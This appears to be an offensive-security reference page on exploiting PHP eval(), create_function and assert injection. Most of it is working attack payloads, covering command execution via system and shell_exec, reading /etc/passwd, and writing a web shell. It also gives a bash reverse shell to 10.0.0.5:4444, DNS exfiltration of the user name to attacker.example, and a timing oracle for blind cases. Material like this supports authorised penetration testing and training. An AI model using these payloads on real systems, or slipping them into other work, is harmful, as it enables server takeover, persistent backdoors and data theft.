---
title: "PHP eval() injection: arbitrary code execution from a dynamic sink"
description: "eval() executes its string argument as PHP, so attacker-controlled input reaching it runs arbitrary code in the interpreter process, with create_function and assert as sibling dynamic-eval sinks."
keywords:
  - PHP eval injection
  - eval RCE
  - create_function
  - assert code execution
  - system exec shell_exec
  - PHP code injection
---

# eval()

`eval()` takes a string and executes it as PHP code in the current interpreter process. When any part of that string is attacker-controlled, the attacker runs PHP, which is remote code execution with the privileges, loaded extensions, and open connections of the running process. This is genuine and unrestricted execution, not a confined formula evaluator.

## The sink and its siblings

The canonical sink is `eval()`, which requires its argument to be syntactically complete PHP and expects statements to be terminated.

```php
eval("\$result = $userInput;");
eval($userInput);
```

Two siblings evaluate strings as code the same way and are treated identically:

- `create_function($args, $body)` builds a function whose body is the supplied string, so a controlled `$body` is executed when the function is called. It was removed in PHP 8 but remains common in older code.
- `assert($userInput)` evaluated a string argument as PHP in versions through 7.x, making a controlled argument equivalent to `eval`.

```php
$fn = create_function('$x', $userInput);   // body is code
assert($userInput);                          // string argument is code
```

## Exploitation

Because the string runs as PHP, escalate straight to command execution through any of the process-execution functions or the backtick operator. Close whatever syntactic context the sink expects, run the payload, and suppress the remainder.

```php
# Into eval("$result = $userInput;");
system('id');//
`id`;//
shell_exec('uname -a');//
```

Terminate the injected statement with `;` and comment out the trailing fragment (`//` or `#`) so the surrounding template stays valid. Where direct command functions are disabled, PHP itself is still fully available for file and network access.

```php
file_get_contents('/etc/passwd');//
file_put_contents('shell.php', '<?php system($_GET[0]);');//
```

The injected string runs inside the PHP process, so it also inherits that process's database handles, session state, and loaded credentials, which are reachable with ordinary PHP without any further foothold.

## Confirming execution

Prove code runs with an expression whose output cannot be a reflected copy of the input.

```php
print(8111*9);//
```

A response containing `72999` confirms the string was executed rather than echoed. A reflected `uid=33(www-data)` from `system('id')` then confirms both execution and the service account, from which a full interactive foothold follows.

```php
system('bash -c "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"');//
```

## Blind execution

When output is not returned, drive an out-of-band signal or a timing oracle, the same way as any blind code-execution sink.

```php
system('nslookup $(whoami).attacker.example');//
usleep(10000000);//
```

A ten-second delay confirms execution where no reflection and no egress are available, and pairing the delay with a condition turns it into a boolean oracle over host state.

## Tools

- **Burp Suite**: Repeater for delivering eval payloads and reading command output.
- **tplmap**: detects and exploits PHP eval()-based code injection.

## References

- [PHP manual: eval](https://www.php.net/manual/en/function.eval.php)
- [PHP manual: assert](https://www.php.net/manual/en/function.assert.php)
- [OWASP: Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [PayloadsAllTheThings: PHP command injection and code evaluation](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
